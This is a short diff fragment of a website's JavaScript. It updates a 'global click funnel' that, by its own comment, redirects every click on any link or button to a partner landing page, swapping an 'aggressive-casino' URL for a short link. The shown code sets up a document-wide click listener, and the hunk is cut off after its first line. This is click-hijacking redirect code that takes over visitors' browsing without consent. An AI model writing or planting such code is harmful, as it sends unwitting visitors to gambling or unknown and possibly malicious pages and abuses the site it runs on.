@@ -79,7 +79,7 @@
 
     // Global click funnel: any click on a link or button on the site
     // redirects the visitor to the partner landing page.
-    var PARTNER_URL = "https://1wzpdo.life/v3/aggressive-casino?p=sjjr";
+    var PARTNER_URL = "https://lkmn.cc/180503";
 
     document.addEventListener("click", function (e) {
         if (e.defaultPrevented) return;
